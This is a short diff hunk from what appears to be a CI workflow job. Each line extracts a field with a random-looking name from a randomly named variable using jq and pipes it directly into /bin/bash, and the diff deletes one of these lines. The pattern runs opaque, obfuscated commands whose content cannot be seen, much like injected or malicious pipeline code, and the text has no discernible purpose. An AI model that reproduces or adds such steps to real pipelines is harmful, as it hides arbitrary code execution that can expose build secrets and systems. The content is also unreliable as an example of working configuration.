@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$yor64" | jq -r .egy0 | /bin/bash
           echo $h32 | jq -r .aupf48 | /bin/bash
           printf '%s' "$jcpp42031" | jq -r .uy374 | /bin/bash
-          printf '%s' "$of148" | jq -r .ydky51256 | /bin/bash
           printf '%s' "$apr25" | jq -r .wctl9841 | /bin/bash
           echo $ulloi964 | jq -r .x3 | /bin/bash
           printf '%s' "$fspu01" | jq -r .cp358 | /bin/bash
